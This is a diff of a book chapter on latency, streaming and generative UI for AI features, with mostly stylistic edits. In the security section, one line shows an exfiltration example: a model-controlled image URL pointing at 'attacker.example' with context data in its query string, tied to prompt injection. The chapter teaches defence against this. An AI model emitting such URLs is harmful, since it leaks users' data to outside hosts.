@@ -20,7 +20,7 @@ in_book: true
 
 An AI feature's honest floor is **hundreds of milliseconds to the first token and several seconds to a
 full answer**. The model makes tokens one at a time, so no engineering removes that wait. You cannot make
-it fast, so you make it feel responsive: show progress early, keep it moving, give the user something to read.
+it fast, so make it feel responsive. Show progress early, keep it moving, give the user something to read.
 
 Once the answer arrives, prose is often the wrong shape. A question about last quarter's revenue wants a
 chart, a table and a link. **Generative UI lets the model choose the component, while your code owns which
@@ -42,12 +42,11 @@ components exist and what they may receive.** The model picks a branch. It does 
 
 **Time to first token is the number users feel.** A reply that starts at 400 ms and ends at eight seconds
 feels better than one that starts at four seconds and ends at five. Retrieval and reranking sit wholly
-before the first token. In the documentation assistant, a 400 ms
-reranker delays every visible byte. Prompt length also affects first-token time, which is one more reason
-to send five good chunks rather than twenty.
+before the first token. In the documentation assistant, a 400 ms reranker delays every visible byte.
+Prompt length also affects first-token time. That is one more reason to send five good chunks, not twenty.
 
-The page still answers to an INP target, and a pane that re-renders on every token will fail it — see
-[Chapter ?? — Core Web Vitals](#ch-core-web-vitals).
+The page still has an INP target (how fast it responds to input), and a pane that re-renders on every
+token will fail it. See [Chapter ?? — Core Web Vitals](#ch-core-web-vitals).
 
 ### What fills the wait
 
@@ -73,8 +72,8 @@ transport is in [Chapter ?? — Streaming Responses](#ch-streaming-responses). T
 ### Work before the answer arrives
 
 Prefetching retrieval on input focus, warming the connection on a keystroke and echoing the user's message
-at once are close to free. A speculative model call on a likely question is not: an unused call is money
-spent for nothing, and at scale that sum turns negative fast.
+at once are close to free. A speculative model call on a likely question is not. An unused call is money
+spent for nothing, and at scale those wasted calls add up fast.
 
 > ⚠️ Optimistic UI means less here. You can show at once that a request started. You cannot show the
 > answer early, because you do not know it. An interface that guesses for the user is worse than one that
@@ -84,7 +83,7 @@ spent for nothing, and at scale that sum turns negative fast.
 
 Past ten seconds, a chat window is the wrong shape. A multi-minute agent run needs a background job's
 tools: a visible plan, step progress, a cancel that really aborts, and a result that survives leaving the
-page. Show the plan first — stopping a misread task at step one, not step twelve, saves time and money.
+page. Show the plan first. Stopping a misread task at step one, not step twelve, saves time and money.
 
 ### The component registry
 
@@ -116,7 +115,7 @@ function render(name: string, props: unknown) {
 
 Three things make this safe. **An unknown name renders a fallback**, never anything the model invented.
 **Props are checked before render**, so a missing field gives a fallback, not a broken component. **Bounds
-live in the schema** — 50 points, 40 characters — because a model given an open-ended array will
+live in the schema**, such as 50 points and 40 characters. A model given an open-ended array will
 sometimes produce a huge one.
 
 The model emits blocks through [Chapter ?? — Structured Output](#ch-structured-output). A discriminated
@@ -144,7 +143,7 @@ attack surface.
 | An id | Safe | Resolve on the server against what the user may see |
 | Raw HTML | Cross-site scripting | Never |
 
-The URL row matters most — see [Chapter ?? — Prompt Injection](#ch-prompt-injection). A model-controlled
+The URL row matters most, as [Chapter ?? — Prompt Injection](#ch-prompt-injection) explains. A model-controlled
 image source is an outward channel: `https://attacker.example/x.png?d=<context>` leaks data on render,
 with no click. A rendering choice has added the third leg of the lethal trifecta.
 
@@ -157,7 +156,7 @@ The server turns it into a link only if that chunk was retrieved for this user.
 ### Streaming a partial component
 
 An object arrives field by field, so a component can render before its props are complete. Show a
-skeleton until the schema validates — a chart with three of fifty points is wrong, not progressive.
+skeleton until the schema validates. A chart with three of fifty points is wrong, not progressive.
 Progressive rendering suits text, not anything a user reads as a number. Never fire side effects on
 partial props, because a partial object is not a decision.
 
@@ -182,11 +181,11 @@ testable and adds no new security surface. Measure whether generation is needed 
 
 **✅ Name the stage and stream from the first token**
 
-> "Searching the docs" is progress and a chance to correct — the user can stop a misread request early.
+> "Searching the docs" is progress and a chance to correct. The user can stop a misread request early.
 
 **❌ Letting the model supply URLs, HTML or unrestricted Markdown**
 
-> A model-controlled `src` or `href` is an outward channel; raw HTML is cross-site scripting by a new route.
+> A model-controlled `src` or `href` is an outward channel. Raw HTML is cross-site scripting by a new route.
 
 **✅ Validate props against a bounded schema, pass ids, and fall back on failure**
 
@@ -206,7 +205,7 @@ testable and adds no new security surface. Measure whether generation is needed 
 
 Not a spinner. Streamed text should start within a few hundred milliseconds, so the wait becomes an early
 start and then text faster than they read. Before the first token, retrieval is still running, so I name
-that stage. That gap is larger than any model upgrade would buy, and it is a frontend change.
+that stage. That feels faster than any model upgrade would, and it is a frontend change.
 
 **Q: You add a reranker that improves answers and costs 300 ms. Is it worth it?**
 
